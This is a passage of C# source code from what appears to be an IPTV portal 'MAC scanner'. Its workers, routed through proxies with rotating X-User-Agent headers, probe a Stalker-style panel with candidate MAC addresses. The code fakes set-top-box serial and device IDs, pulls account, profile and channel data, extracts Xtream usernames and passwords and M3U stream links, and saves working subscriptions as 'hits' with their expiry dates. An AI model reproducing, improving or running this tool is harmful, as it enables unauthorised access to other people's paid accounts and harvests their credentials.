                                            if (profRes2 != null && !string.IsNullOrWhiteSpace(profRes2.Value.text))
                                            {
                                                profileText = profRes2.Value.text;
                                                profileSuccess = true;
                                            }
                                        }
                                        catch (OperationCanceledException)
                                        {
                                            profileText = "";
                                            profileSuccess = false;
                                            consecutiveTimeouts++;
                                            adaptiveDelayMs = Math.Min(1200, adaptiveDelayMs + 150);
                                            SafeRaiseStatus($"[TIMEOUT] Worker {workerId} GetProfile(prehash) (parallel) for {macForCookie}", true);
                                        }
                                        catch (Exception exPPTop) { LogError("GetProfilePrehashParallelTop", exPPTop); }
                                    }
                                }

                                // --- NEW: last-resort extended get_profile fallback (tries addl params seen in check scripts)
                                if (!profileSuccess && !string.IsNullOrEmpty(prehash))
                                {
                                    try
                                    {
                                        using var perCallCts = CancellationTokenSource.CreateLinkedTokenSource(ct);
                                        perCallCts.CancelAfter(perCallTimeout);
                                        SafeRaiseStatus($"Worker {workerId} trying extended get_profile fallback (hw/prehash) for {macForCookie}");
                                        var extendedProfile = await portalClient.GetProfileWithParamsAsync(
                                            mac: macForCookie,
                                            adid: adid,
                                            token: token ?? "",
                                            snCut13: PortalClient.ComputeSnCut13(macForCookie),
                                            hwVersion2: prehash,
                                            prehash: prehash,
                                            xUserAgent: lastXuaUsed,
                                            includeExtendedDeviceParams: true,
                                            imageVersion: null,
                                            hwVersionOverride: null,
                                            ct: perCallCts.Token).ConfigureAwait(false);

                                        if (!PortalClient.IsEmptyJsArray(extendedProfile ?? ""))
                                        {
                                            profileText = extendedProfile ?? "";
                                            profileSuccess = true;
                                        }
                                    }
                                    catch (OperationCanceledException)
                                    {
                                        SafeRaiseStatus($"[TIMEOUT] Worker {workerId} extended get_profile fallback", true);
                                    }
                                    catch (Exception ex)
                                    {
                                        LogError("ExtendedGetProfileFallback", ex);
                                    }
                                }

                                // If still not successful and Variant1 enabled, call it to try to get profile/account/create_link (controlled)
                                if (!profileSuccess && enableVariant1)
                                {
                                    try
                                    {
                                        var v1 = await RunVariant1WithControlsAsync(config, config.PanelUrl, macForCookie, thisWorkerProxy, perCallTimeoutMs, variant1NegCacheSeconds, ct).ConfigureAwait(false);
                                        if (v1 != null && v1.Success)
                                        {
                                            if (string.IsNullOrWhiteSpace(profileText) && !string.IsNullOrWhiteSpace(v1.ProfileBody))
                                                profileText = v1.ProfileBody;
                                            if (!string.IsNullOrWhiteSpace(v1.AccountBody) && (config.VerboseLogging || config.SaveRawAlways))
                                            {
                                                if (_bgFileWriter != null) _bgFileWriter.TryEnqueue("account", macForCookie, v1.AccountBody);
                                                else HitWriter.SaveRawResponse("account", macForCookie, v1.AccountBody);
                                            }
                                            if (!string.IsNullOrWhiteSpace(v1.GenresBody) && (config.VerboseLogging || config.SaveRawAlways))
                                            {
                                                if (_bgFileWriter != null) _bgFileWriter.TryEnqueue("genres", macForCookie, v1.GenresBody);
                                                else HitWriter.SaveRawResponse("genres", macForCookie, v1.GenresBody);
                                            }
                                            token = token ?? v1.Token;
                                            prehash = prehash ?? v1.Prehash;
                                        }
                                    }
                                    catch (Exception ex) { LogError("Variant1.Run (post-profile)", ex); }
                                }

                                if (consecutiveTimeouts >= maxConsecutiveTimeoutsBeforeDiagnostic)
                                {
                                    SafeRaiseStatus($"Worker {workerId}: running connectivity diagnostic...", true);

                                    bool diagOk = false;
                                    try
                                    {
                                        var diagUrl = config.PanelUrl;
                                        if (!diagUrl.StartsWith("http://", StringComparison.OrdinalIgnoreCase) && !diagUrl.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
                                            diagUrl = "http://" + diagUrl;

                                        var resp = await _diagnosticHttpClient.GetAsync(diagUrl).ConfigureAwait(false);
                                        diagOk = resp.IsSuccessStatusCode;
                                    }
                                    catch (Exception dex)
                                    {
                                        LogError("ConnectivityDiagnostic", dex);
                                        diagOk = false;
                                    }

                                    if (!diagOk)
                                    {
                                        SafeRaiseStatus($"[FATAL] Worker {workerId}: connectivity to panel '{config.PanelUrl}' appears broken.", true);
                                        return;
                                    }
                                    else
                                    {
                                        consecutiveTimeouts = 0;
                                        adaptiveDelayMs = 0;
                                        SafeRaiseStatus($"Worker {workerId}: connectivity diagnostic OK, resuming.", true);
                                    }
                                }

                                var accText = "";
                                var mainInfo = "";
                                try
                                {
                                    using var perCallCts1 = CancellationTokenSource.CreateLinkedTokenSource(ct);
                                    perCallCts1.CancelAfter(perCallTimeout);
                                    accText = await portalClient.GetAccountInfoAsync(macForCookie, adid, token ?? "", perCallCts1.Token).ConfigureAwait(false) ?? "";
                                    consecutiveTimeouts = 0;
                                    adaptiveDelayMs = 0;
                                }
                                catch (OperationCanceledException) { consecutiveTimeouts++; adaptiveDelayMs = Math.Min(1200, adaptiveDelayMs + 150); SafeRaiseStatus($"[TIMEOUT] Worker {workerId} GetAccountInfo for {macForCookie}", true); }
                                catch (Exception exAcc) { consecutiveTimeouts++; adaptiveDelayMs = Math.Min(1200, adaptiveDelayMs + 100); LogError("GetAccountInfo", exAcc); }

                                try
                                {
                                    using var perCallCts2 = CancellationTokenSource.CreateLinkedTokenSource(ct);
                                    perCallCts2.CancelAfter(perCallTimeout);
                                    mainInfo = await portalClient.GetMainAccountInfoAsync(macForCookie, token ?? "", perCallCts2.Token).ConfigureAwait(false) ?? "";
                                    consecutiveTimeouts = 0;
                                    adaptiveDelayMs = 0;
                                }
                                catch (OperationCanceledException) { consecutiveTimeouts++; adaptiveDelayMs = Math.Min(1200, adaptiveDelayMs + 150); SafeRaiseStatus($"[TIMEOUT] Worker {workerId} GetMainAccountInfo for {macForCookie}", true); }
                                catch (Exception exMain) { consecutiveTimeouts++; adaptiveDelayMs = Math.Min(1200, adaptiveDelayMs + 100); LogError("GetMainAccountInfo", exMain); }

                                var accCombined = (accText ?? "") + "\n" + (mainInfo ?? "");
                                if (config.VerboseLogging || config.SaveRawAlways)
                                {
                                    try
                                    {
                                        if (_bgFileWriter != null) _bgFileWriter.TryEnqueue("account", macForCookie, accCombined);
                                        else HitWriter.SaveRawResponse("account", macForCookie, accCombined);
                                    }
                                    catch (Exception ex) { LogError("SaveRawResponse-account", ex); }
                                }

                                // Vorab-Tage + Länder
                                int? preParsedDays = null;
                                string? preCountrySample = null;
                                try
                                {
                                    preParsedDays = ExtractDaysFromCombinedText(accCombined + "\n" + profileText);
                                    var countryCombined = (accCombined ?? "") + "\n" + (profileText ?? "") + "\n" + (mainInfo ?? "");
                                    preCountrySample = ExtractCountryListFromCombined(countryCombined);
                                }
                                catch { }

                                var result = new ScanResult
                                {
                                    Mac = macForCookie,
                                    Info = "Parsed profile/account",
                                    TV = true,
                                    CreatedAt = DateTime.UtcNow
                                };

                                if (!string.IsNullOrWhiteSpace(preCountrySample))
                                    result.VPNCountry = preCountrySample;

                                // --- NEW: extract IP from responses (like vpnip in the Python) ---
                                try
                                {
                                    string? ip = null;
                                    // common places: "ip":"1.2.3.4"
                                    var mIp = Regex.Match(accCombined + "\n" + profileText, @"\""ip\""\s*:\s*\""(?<ip>[\d\.]{7,15})\""", RegexOptions.IgnoreCase);
                                    if (mIp.Success) ip = mIp.Groups["ip"].Value;
                                    else
                                    {
                                        var m2 = Regex.Match(accCombined + "\n" + profileText, @"(?<!\d)(?<ip>(?:\d{1,3}\.){3}\d{1,3})(?!\d)");
                                        if (m2.Success) ip = m2.Groups["ip"].Value;
                                    }
                                    if (!string.IsNullOrWhiteSpace(ip))
                                    {
                                        try
                                        {
                                            var loc = await portalClient.GetIpLocationAsync(ip, CancellationToken.None).ConfigureAwait(false);
                                            if (!string.IsNullOrWhiteSpace(loc))
                                            {
                                                result.VPNCountry = loc;
                                                if (config.VerboseLogging || config.SaveRawAlways)
                                                {
                                                    if (_bgFileWriter != null) _bgFileWriter.TryEnqueue("ipinfo", macForCookie, $"{ip} -> {loc}");
                                                    else HitWriter.SaveRawResponse("ipinfo", macForCookie, $"{ip} -> {loc}");
                                                }
                                            }
                                        }
                                        catch { /* swallow */ }
                                    }
                                }
                                catch { /* best effort */ }

                                var ffFromProfile = PortalClient.ExtractFfmpegLink(profileText ?? "", config.PanelUrl);
                                var ffFromAccount = PortalClient.ExtractFfmpegLink(accText ?? "", config.PanelUrl) ?? PortalClient.ExtractFfmpegLink(mainInfo ?? "", config.PanelUrl);
                                if (!string.IsNullOrEmpty(ffFromProfile)) result.RealUrl = ffFromProfile;
                                else if (!string.IsNullOrEmpty(ffFromAccount)) result.RealUrl = ffFromAccount;

                                try
                                {
                                    if (!string.IsNullOrWhiteSpace(result.RealUrl))
                                    {
                                        try
                                        {
                                            var streamStatus = await portalClient.CheckStreamAsync(result.RealUrl, CancellationToken.None).ConfigureAwait(false);
                                            if (!string.IsNullOrWhiteSpace(streamStatus))
                                            {
                                                result.PlayerApiInfo = string.IsNullOrWhiteSpace(result.PlayerApiInfo) ? $"StreamCheck: {streamStatus}" : result.PlayerApiInfo + "\nStreamCheck: " + streamStatus;
                                            }
                                        }
                                        catch { /* best-effort */ }
                                    }
                                }
                                catch { }

                                // Xtream extraction
                                try
                                {
                                    var combinedAll = (accCombined ?? "") + "\n" + (profileText ?? "") + "\n" + (mainInfo ?? "");

                                    var helperCreds = PortalHelpers.TryExtractXtreamCreds(combinedAll, config.PanelUrl);
                                    if (string.IsNullOrWhiteSpace(helperCreds.baseUrl))
                                        helperCreds = TryExtractXtreamCredsFromText(combinedAll, config.PanelUrl);

                                    var baseUrl = helperCreds.baseUrl;
                                    var xUser = helperCreds.user;
                                    var xPass = helperCreds.pass;

                                    if (!string.IsNullOrWhiteSpace(baseUrl) && !string.IsNullOrWhiteSpace(xUser) && !string.IsNullOrWhiteSpace(xPass))
                                    {
                                        result.M3uLink = $"{baseUrl}/get.php?username={Uri.EscapeDataString(xUser)}&password={Uri.EscapeDataString(xPass)}&type=m3u_plus";

                                        using var perCallCtsX = CancellationTokenSource.CreateLinkedTokenSource(ct);
                                        perCallCtsX.CancelAfter(perCallTimeout);
                                        var playerApiJson = await FetchXtreamPlayerApiAsync(baseUrl!, xUser!, xPass!, perCallCtsX.Token, perCallTimeout).ConfigureAwait(false);
                                        if (!string.IsNullOrWhiteSpace(playerApiJson))
                                        {
                                            var parsed = PortalHelpers.ParsePlayerApi(playerApiJson);
                                            if (parsed != null && parsed.Count > 0)
                                                result.PlayerApiInfo = string.Join("\n", parsed.Select(kv => $"{kv.Key}: {kv.Value}"));
                                            else
                                                result.PlayerApiInfo = playerApiJson;
                                        }
                                        else if (string.IsNullOrWhiteSpace(result.PlayerApiInfo))
                                            result.PlayerApiInfo = $"{baseUrl}/player_api.php?username={xUser}&password={xPass}";
                                    }
                                }
                                catch { }

                                int? daysParsed;
                                string reason;
                                var isReal = HitValidator.IsValidHit(profileText ?? "", accCombined ?? "", 0, out daysParsed, out reason);
                                SafeRaiseStatus($"[DBG] Validator {macForCookie}: isReal={isReal} rawDays={(daysParsed?.ToString() ?? "null")} reason={reason}");

                                int? effectiveDays = daysParsed ?? preParsedDays;
                                if (effectiveDays.HasValue && effectiveDays.Value <= -3650) effectiveDays = null;

                                result.DaysUntilExpire = effectiveDays ?? -1;
                                result.Expires = (effectiveDays.HasValue && effectiveDays.Value >= 0) ? DateTime.UtcNow.AddDays(effectiveDays.Value) : (DateTime?)null;

                                using (var md5b = MD5.Create())
                                    result.SN = BitConverter.ToString(md5b.ComputeHash(Encoding.UTF8.GetBytes(macForCookie))).Replace("-", "").ToUpperInvariant();
                                using (var sha = SHA256.Create())
                                    result.DEV = BitConverter.ToString(sha.ComputeHash(Encoding.UTF8.GetBytes(macForCookie))).Replace("-", "").ToUpperInvariant();
                                using (var sha1 = SHA1.Create())
                                    result.DEV2 = BitConverter.ToString(sha1.ComputeHash(Encoding.UTF8.GetBytes(macForCookie))).Replace("-", "").ToUpperInvariant();
                                result.SG = (result.SN ?? "").Substring(0, Math.Min(13, (result.SN ?? "").Length)) + "+" + macForCookie;
                                result.LiveList = ExtractLiveListFromCombined(accCombined ?? "", profileText ?? "");

                                var hasValidExpiry = effectiveDays.HasValue && effectiveDays.Value >= 0;
                                var hasStreamUrl = !string.IsNullOrWhiteSpace(result.RealUrl) || !string.IsNullOrWhiteSpace(result.M3uLink);
                                var hasPlayerApi = !string.IsNullOrWhiteSpace(result.PlayerApiInfo);
                                var hasBalanceOrTariff = !string.IsNullOrWhiteSpace(accCombined) && Regex.IsMatch(accCombined, @"""(account_balance|balance|tariff_expired_date|expire_billing_date|tariff_id)""\s*:", RegexOptions.IgnoreCase);
                                var hasPhone = Regex.IsMatch(accCombined ?? "", @"""phone""\s*:\s*""([^""]+)""", RegexOptions.IgnoreCase);
                                bool strongSignals = hasStreamUrl || hasPlayerApi || hasBalanceOrTariff || hasPhone;

                                int minDays = 0;
                                try { minDays = config.MinExpDays; } catch { minDays = 0; }

                                bool expiryOk = hasValidExpiry && (minDays == 0 || effectiveDays!.Value >= minDays);
                                bool allowSave = expiryOk || (!hasValidExpiry && strongSignals && isReal) || config.ForceSaveAllHits;

                                if (!allowSave)
                                {
                                    if (hasValidExpiry && minDays > 0 && effectiveDays!.Value < minDays)
                                        SafeRaiseStatus($"[SKIP] {macForCookie} filtered by MinExpDays {minDays} (got {effectiveDays})");
                                    else
                                        SafeRaiseStatus($"[SKIP] {macForCookie} save-guard (weak/no signals).");
                                    continue;
                                }

                                // Save result: prefer background writer; fallback to synchronous DB save if bg writer missing
                                try
                                {
                                    if (!(_bgDbWriter?.TryEnqueue(result) ?? false))
                                    {
                                        try { lock (_dbLock) { db.SaveResult(result); } }
                                        catch (Exception ex) { SafeRaiseStatus($"DB save failed: {ex.Message}", true); LogError("DB.SaveResult", ex); }
                                    }
                                }
                                catch (Exception ex) { SafeRaiseStatus($"DB save failed: {ex.Message}", true); LogError("DB.SaveResult", ex); }

                                try
                                {
                                    if (!string.IsNullOrWhiteSpace(config.PanelUrl) && !string.IsNullOrWhiteSpace(token))
                                    {
                                        var countryList = await FetchGenresWithFallbackInternalAsync(config, portalClient, macForCookie, token!, lastXuaUsed, accCombined, profileText, mainInfo, perCallTimeout, ct).ConfigureAwait(false);

                                        if (!string.IsNullOrWhiteSpace(countryList))
                                        {
                                            result.VPNCountry = countryList;
                                            try
                                            {
                                                if (!(_bgDbWriter?.TryEnqueue(result) ?? false))
                                                {
                                                    try { lock (_dbLock) { db.SaveResult(result); } } catch (Exception ex) { LogError("DB.SaveResult_updateCountryFromGenres", ex); }
                                                }
                                            }
                                            catch (Exception ex) { LogError("DB.SaveResult_updateCountryFromGenres", ex); }
                                        }
                                    }
                                }
                                catch (Exception ex)
                                {
                                    LogError("GenresFetch", ex);
                                }

                                var channelsText = "";
                                try
                                {
                                    using var perCallCts = CancellationTokenSource.CreateLinkedTokenSource(ct);
                                    perCallCts.CancelAfter(perCallTimeout);
                                    channelsText = await portalClient.GetAllChannelsAsync(macForCookie, token ?? "", perCallCts.Token, lastXuaUsed ?? XUserAgentCandidates[0]).ConfigureAwait(false) ?? "";
                                    consecutiveTimeouts = 0;
                                    adaptiveDelayMs = 0;
                                    if (config.VerboseLogging || config.SaveRawAlways)
                                    {
                                        if (_bgFileWriter != null) _bgFileWriter.TryEnqueue("channels", macForCookie, channelsText ?? "");
                                        else HitWriter.SaveRawResponse("channels", macForCookie, channelsText ?? "");
                                    }
                                }
                                catch (OperationCanceledException) { consecutiveTimeouts++; adaptiveDelayMs = Math.Min(1200, adaptiveDelayMs + 150); SafeRaiseStatus($"[TIMEOUT] Worker {workerId} GetAllChannels", true); }
                                catch (Exception ex) { consecutiveTimeouts++; adaptiveDelayMs = Math.Min(1200, adaptiveDelayMs + 100); LogError("GetAllChannels", ex); }

                                var cidMatch = Regex.Match(channelsText ?? "", @"ch_id""\s*:\s*""?(\d+)""?", RegexOptions.IgnoreCase);
                                if (!cidMatch.Success) cidMatch = Regex.Match(channelsText ?? "", @"""id""\s*:\s*""?(\d+)""?", RegexOptions.IgnoreCase);
                                if (cidMatch.Success)
                                {
                                    var cid = cidMatch.Groups[1].Value;
                                    try
                                    {
                                        using var perCallCts = CancellationTokenSource.CreateLinkedTokenSource(ct);
                                        perCallCts.CancelAfter(perCallTimeout);
                                        var linkText = await portalClient.CreateLinkAsync(macForCookie, token ?? "", cid, perCallCts.Token, lastXuaUsed ?? XUserAgentCandidates[0]).ConfigureAwait(false);
                                        if (config.VerboseLogging || config.SaveRawAlways)
                                        {
                                            if (_bgFileWriter != null) _bgFileWriter.TryEnqueue("create_link", macForCookie, linkText ?? "");
                                            else HitWriter.SaveRawResponse("create_link", macForCookie, linkText ?? "");
                                        }
                                        var ff = PortalClient.ExtractFfmpegLink(linkText ?? "", config.PanelUrl);
                                        if (!string.IsNullOrEmpty(ff))
                                        {
                                            result.RealUrl = ff;
                                            try { if (_bgFileWriter != null) _bgFileWriter.TryEnqueue("final_stream", macForCookie, ff); else HitWriter.SaveRawResponse("final_stream", macForCookie, ff); } catch { }
                                        }

                                        try
                                        {
                                            if (string.IsNullOrWhiteSpace(result.M3uLink) && !string.IsNullOrWhiteSpace(linkText))
                                            {
                                                var m3 = Regex.Match(linkText, @"https?:\/\/\S+\/get\.php\?[^ \r\n]+", RegexOptions.IgnoreCase);
                                                if (m3.Success)
                                                {
                                                    var rawMatch = m3.Value.Trim();
                                                    var normalized = PortalHelpers.NormalizeGetPhpWithNestedPassword(rawMatch, config.PanelUrl);
                                                    result.M3uLink = string.IsNullOrWhiteSpace(normalized) ? rawMatch : normalized;
                                                }
                                                else
                                                {
                                                    var normalizedWhole = PortalHelpers.NormalizeGetPhpWithNestedPassword(linkText, config.PanelUrl);
                                                    if (!string.IsNullOrWhiteSpace(normalizedWhole)) result.M3uLink = normalizedWhole;
                                                }
                                            }
                                        }
                                        catch { /* best-effort */ }

                                        consecutiveTimeouts = 0;
                                        adaptiveDelayMs = 0;

                                        try
                                        {
                                            var postCountryCombined = (channelsText ?? "") + "\n" + (linkText ?? "");
                                            var postCountry = ExtractCountryListFromCombined(postCountryCombined);
                                            if (!string.IsNullOrWhiteSpace(postCountry))
                                            {
                                                bool shouldUpdate = string.IsNullOrWhiteSpace(result.VPNCountry) || (result.VPNCountry?.Length ?? 0) < (postCountry.Length);
                                                if (shouldUpdate)
                                                {
                                                    result.VPNCountry = postCountry;
                                                    try
                                                    {
                                                        if (!(_bgDbWriter?.TryEnqueue(result) ?? false))
                                                        {
                                                            try { lock (_dbLock) { db.SaveResult(result); } } catch (Exception ex) { LogError("DB.SaveResult_updateCountry", ex); }
                                                        }
                                                    }
                                                    catch (Exception ex) { LogError("DB.SaveResult_updateCountry", ex); }
                                                }
                                            }
                                        }
                                        catch (Exception ex) { LogError("PostCountryExtract", ex); }
                                    }
                                    catch (OperationCanceledException) { consecutiveTimeouts++; adaptiveDelayMs = Math.Min(1200, adaptiveDelayMs + 150); SafeRaiseStatus($"[TIMEOUT] Worker {workerId} CreateLink", true); }
                                    catch (Exception ex) { consecutiveTimeouts++; adaptiveDelayMs = Math.Min(1200, adaptiveDelayMs + 100); LogError("CreateLink", ex); }
                                }

                                try
                                {
                                    if (string.IsNullOrWhiteSpace(result.M3uLink))
                                    {
                                        var allText = (accCombined ?? "") + "\n" + (profileText ?? "") + "\n" + (mainInfo ?? "") + "\n" + (channelsText ?? "");
                                        var m = Regex.Match(allText, @"https?:\/\/\S+\/get\.php\?[^ \r\n]+", RegexOptions.IgnoreCase);
                                        if (m.Success)
                                        {
                                            var raw = m.Value.Trim();
                                            var normalized = PortalHelpers.NormalizeGetPhpWithNestedPassword(raw, config.PanelUrl);
                                            result.M3uLink = string.IsNullOrWhiteSpace(normalized) ? raw : normalized;
                                        }
                                        else
                                        {
                                            var normalizedFull = PortalHelpers.NormalizeGetPhpWithNestedPassword(allText, config.PanelUrl);
                                            if (!string.IsNullOrWhiteSpace(normalizedFull)) result.M3uLink = normalizedFull;
                                        }
                                    }
                                }
                                catch { /* best-effort */ }

                                try
                                {
                                    try { HitWriter.CurrentScanType = endpointForThisWorker; } catch { }
                                    HitWriter.Save(result, config.PanelUrl);
                                    SafeRaiseStatus($"[SAVED] {macForCookie}", true);

                                    DateTime endTime = DateTime.UtcNow;
                                    Interlocked.Add(ref _totalLatencyTicks, (endTime - startTime).Ticks);
                                    Interlocked.Increment(ref _processedCountAll);
                                }
                                catch (Exception ex) { SafeRaiseStatus($"HitWriter save failed: {ex.Message}", true); LogError("HitWriter.Save", ex); }

                                SafeRaiseResult(result);

                                processed++;
                                if (processed % 50 == 0)
                                {
                                    SafeRaiseStatus($"Worker {workerId}: processed {processed} items.");
                                }
                            }
                            catch (OperationCanceledException) { break; }
                            catch (Exception ex)
                            {
                                LogError("WorkerMain", ex);
                            }
                        }
                    }
                    catch (OperationCanceledException) { }
                    catch (Exception ex)
                    {
                        LogError("WorkerTop", ex);
                    }
                    finally
                    {
                        try { portalClient?.Dispose(); } catch { }
                        SafeRaiseStatus($"Worker {workerId} stopped", true);
                    }
                }, ct);

                _workerTasks.Add(workerTask);
            }

            // Wait for workers to finish (they'll stop when channel is completed or token cancelled)
            try { await Task.WhenAll(_workerTasks.ToArray()).ConfigureAwait(false); }
            catch (OperationCanceledException) { }
            catch (Exception ex) { LogError("WhenAllWorkers", ex); }

            // Stop producer
            try
            {
                _producerCts?.Cancel();
                if (_producerTask != null) await Task.WhenAny(_producerTask).ConfigureAwait(false);
            }
            catch { }

            // Dispose background services gracefully
            try { if (_metricsService != null) await _metricsService.DisposeAsync().ConfigureAwait(false); } catch { }
            try { if (_bgDbWriter != null) await _bgDbWriter.DisposeAsync().ConfigureAwait(false); } catch { }
            try { if (_bgFileWriter != null) await _bgFileWriter.DisposeAsync().ConfigureAwait(false); } catch { }
            try { if (_statusBroadcaster != null) await _statusBroadcaster.DisposeAsync().ConfigureAwait(false); } catch { }

            // Clear dedup cache on clean shutdown so a subsequent StartAsync won't be affected
            try { _recentMacs.Clear(); } catch { }

            SafeRaiseStatus("Scan finished/terminated.", true);
        }

        // Runs Variant1 (LegacyPortalVariant1.RunAsync) but only when allowed by semaphore and negative cache.
        private async Task<Variant1Result?> RunVariant1WithControlsAsync(
            ScanConfig config,
            string panelUrl,
            string macForCookie,
            string? workerProxy,
            int perCallTimeoutMs,
            int variant1NegCacheSeconds,
            CancellationToken ct)
        {
            if (config == null) return null;
            if (string.IsNullOrWhiteSpace(panelUrl) || string.IsNullOrWhiteSpace(macForCookie)) return null;

            var negKey = panelUrl.Trim().ToLowerInvariant();
            if (_variant1NegCache.TryGetValue(negKey, out var last) && (DateTime.UtcNow - last).TotalSeconds < Math.Max(1, variant1NegCacheSeconds))
            {
                // recently failed - skip
                return null;
            }

            bool entered = false;
            try
            {
                entered = await _variant1Semaphore.WaitAsync(250, ct).ConfigureAwait(false);
                if (!entered) return null;

                Variant1Result? v1 = null;
                try
                {
                    // IMPORTANT FIX: dispose per-call handler to avoid leaking sockets/handlers
                    using var handler = CreateHandlerWithProxy(config, workerProxy);
                    v1 = await LegacyPortalVariant1.RunAsync(panelUrl, macForCookie, handler, perCallTimeoutMs, ct).ConfigureAwait(false);
                }
                catch (OperationCanceledException) { return null; }
                catch (Exception ex)
                {
                    LogError("RunVariant1WithControlsAsync", ex);
                    return null;
                }

                if (v1 == null || !v1.Success)
                {
                    // cache negative result
                    _variant1NegCache[negKey] = DateTime.UtcNow;
                }

                return v1;
            }
            finally
            {
                if (entered)
                {
                    try { _variant1Semaphore.Release(); } catch { }
                }
            }
        }

        // internal implementation of genres multi-fetch used above (full implementation)
        private async Task<string?> FetchGenresWithFallbackInternalAsync(
            ScanConfig config,
            PortalClient portalClient,
            string mac,
            string token,
            string? lastXuaUsed,
            string? accCombined,
            string? profileText,
            string? mainInfo,
            TimeSpan perCallTimeout,
            CancellationToken ct)
        {
            if (config == null) return null;

            var accSafe = accCombined ?? string.Empty;
            var profileSafe = profileText ?? string.Empty;
            var mainSafe = mainInfo ?? string.Empty;

            var candidates = new List<string>();

            if (!string.IsNullOrWhiteSpace(config.PreferredXUserAgent)) candidates.Add(config.PreferredXUserAgent.Trim());
            if (config.AdditionalXUserAgents != null)
            {
                foreach (var a in config.AdditionalXUserAgents)
                    if (!string.IsNullOrWhiteSpace(a) && !candidates.Contains(a!.Trim()))
                        candidates.Add(a!.Trim());
            }

            if (!string.IsNullOrWhiteSpace(lastXuaUsed) && !candidates.Contains(lastXuaUsed))
                candidates.Insert(0, lastXuaUsed);

            foreach (var def in XUserAgentCandidates)
                if (!candidates.Contains(def)) candidates.Add(def);

            var maxCandidates = Math.Max(1, (config.GenresFetchParallelism > 0 ? config.GenresFetchParallelism * 3 : 6));
            candidates = candidates.Take(maxCandidates).ToList();

            var responses = new List<(string body, string xua)>();

            // helper to perform a single fetch with timeout
            async Task<(string body, string xua)> FetchOneAsync(string xua)
            {
                try
                {
                    using var cts = CancellationTokenSource.CreateLinkedTokenSource(ct);
                    if (perCallTimeout.TotalMilliseconds > 0) cts.CancelAfter(perCallTimeout);
                    var body = await portalClient.GetGenresAsync(mac, token, cts.Token, xua).ConfigureAwait(false);
                    return (body ?? "", xua);
                }
                catch (OperationCanceledException) { return (string.Empty, xua); }
                catch (Exception) { return (string.Empty, xua); }
            }

            // If multi-fetch disabled: do single call with preferred xua or lastXuaUsed
            if (!config.EnableGenresMultiFetch)
            {
                var useXua = !string.IsNullOrWhiteSpace(config.PreferredXUserAgent) ? config.PreferredXUserAgent : (lastXuaUsed ?? XUserAgentCandidates[0]);
                try
                {
                    using var perCallCts = CancellationTokenSource.CreateLinkedTokenSource(ct);
                    if (perCallTimeout.TotalMilliseconds > 0) perCallCts.CancelAfter(perCallTimeout);
                    var genresText = await portalClient.GetGenresAsync(mac, token, perCallCts.Token, useXua).ConfigureAwait(false);
                    if (config.VerboseLogging || config.SaveRawAlways)
                    {
                        if (_bgFileWriter != null) _bgFileWriter.TryEnqueue("genres", mac, genresText ?? "");
                        else HitWriter.SaveRawResponse("genres", mac, genresText ?? "");
                    }
                    var titles = ParseTitlesFromGenresText(genresText ?? "");
                    if (titles != null && titles.Count > 0)
                        return string.Join("🌟", titles);
                    // fallback to account/profile extraction if configured
                    if (config.UseAccountResponseAsGenresFallback)
                    {
                        var fallback = ExtractCountryListFromCombined(accSafe + "\n" + profileSafe + "\n" + mainSafe);
                        return fallback;
                    }
                    return null;
                }
                catch { return config.UseAccountResponseAsGenresFallback ? ExtractCountryListFromCombined(accSafe + "\n" + profileSafe + "\n" + mainSafe) : null; }
            }

            // Multi-fetch: perform limited parallel requests varying XUA
            var maxParallel = Math.Max(1, config.GenresFetchParallelism);
            var tasks = new List<Task<(string body, string xua)>>();
            var seenXuas = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

            foreach (var xua in candidates)
            {
                if (seenXuas.Contains(xua)) continue;
                seenXuas.Add(xua);
                tasks.Add(FetchOneAsync(xua));

                // start in batches
                if (tasks.Count >= maxParallel) break;
            }

            // run initial batch
            var completed = await Task.WhenAll(tasks).ConfigureAwait(false);
            responses.AddRange(completed.Where(r => !string.IsNullOrWhiteSpace(r.body)));

            // If initial batch didn't return useful data and there are more candidates, continue sequentially up to limit
            if (responses.Count == 0 && candidates.Count > maxParallel)
            {
                for (int i = maxParallel; i < candidates.Count; i++)
                {
                    var r = await FetchOneAsync(candidates[i]).ConfigureAwait(false);
                    if (!string.IsNullOrWhiteSpace(r.body)) responses.Add(r);
                }
            }

            // Save raw responses if requested
            if ((config.VerboseLogging || config.SaveRawAlways) && responses.Count > 0)
            {
                foreach (var r in responses)
                {
                    try
                    {
                        if (_bgFileWriter != null) _bgFileWriter.TryEnqueue("genres", mac, $"// X-User-Agent: {r.xua}\r\n{r.body}");
                        else HitWriter.SaveRawResponse("genres", mac, $"// X-User-Agent: {r.xua}\r\n{r.body}");
                    }
                    catch { }
                }
            }

            // Parse titles from each response
            var parsedList = new List<(List<string> titles, string body)>();
            foreach (var r in responses)
            {
                try
                {
                    var t = ParseTitlesFromGenresText(r.body);
                    if (t != null && t.Count > 0) parsedList.Add((t, r.body));
                }
                catch { }
            }

            if (parsedList.Count == 0)
            {
                // fallback to account/profile if allowed
                if (config.UseAccountResponseAsGenresFallback)
                {
                    var fallback = ExtractCountryListFromCombined(accSafe + "\n" + profileSafe + "\n" + mainSafe);
                    return fallback;
                }
                return null;
            }

            // Merge according to strategy
            List<string> finalTitles = new List<string>();
            switch (config.GenresMerge)
            {
                case GenresMergeStrategy.FirstNonEmpty:
                    finalTitles = parsedList.OrderBy(p => 0).First().titles;
                    break;
                case GenresMergeStrategy.PreferLongest:
                    finalTitles = parsedList.OrderByDescending(p => p.titles.Count).First().titles;
                    break;
                case GenresMergeStrategy.MergeUnique:
                default:
                    var uniq = new LinkedHashSet<string>(StringComparer.OrdinalIgnoreCase);
                    // prefer order: responses with more titles first (likely more complete)
                    foreach (var p in parsedList.OrderByDescending(x => x.titles.Count))
                    {
                        foreach (var t in p.titles)
                            uniq.Add(t);
                    }
                    finalTitles = uniq.ToList();
                    break;
            }

            if (finalTitles.Count == 0)
            {
                if (config.UseAccountResponseAsGenresFallback)
                    return ExtractCountryListFromCombined(accSafe + "\n" + profileSafe + "\n" + mainSafe);
                return null;
            }

            // join as before
            var countryList = string.Join("🌟", finalTitles);
            return countryList;
        }

        private static List<string>? ParseTitlesFromGenresText(string? genresText)
        {
            if (string.IsNullOrWhiteSpace(genresText)) return null;
            try
            {
                var titles = new List<string>();
                using (var doc = JsonDocument.Parse(genresText))
                {
                    var root = doc.RootElement;
                    if (root.ValueKind == JsonValueKind.Object && root.TryGetProperty("js", out var jsEl))
                    {
                        if (jsEl.ValueKind == JsonValueKind.Array)
                        {
                            foreach (var item in jsEl.EnumerateArray())
                            {
                                if (item.ValueKind == JsonValueKind.Object && item.TryGetProperty("title", out var t) && t.ValueKind == JsonValueKind.String)
